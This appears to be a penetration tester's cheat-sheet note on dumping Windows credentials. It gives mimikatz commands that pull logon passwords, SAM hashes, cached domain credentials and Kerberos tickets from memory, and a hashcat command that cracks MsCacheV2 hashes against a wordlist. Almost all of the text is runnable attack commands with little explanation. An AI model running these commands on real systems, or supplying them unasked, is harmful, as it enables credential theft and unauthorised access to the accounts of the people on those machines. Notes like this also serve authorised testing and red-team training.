#dumping #windows #tool  
### Oneliner

```powershell
.\mimikatz.exe "privilege::debug" "log Admin.log" "sekurlsa::logonpasswords" exit
```

### NTLM Hash Dump

```powershell
privilege::debug
```

```powershell
log cleartext.log
```

```powershell
token::elevate
```

```powershell
lsadump::sam 
```

0r
```powershell
sekurlsa::logonpasswords
```

```powershell
sekurlsa::tickets
```

```powershell
lsadump::cache
```

if nothing works

https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49

#### Cracking MsCacheV2

```cmd
hashcat.exe -a 0 -m 2100 hashcat.hash rockyou.txt -r rules\best64.rule
```

Format 

```
$DCC2$10240#username#hash
```


https://tinyapps.org/docs/domain-cached-credentials.html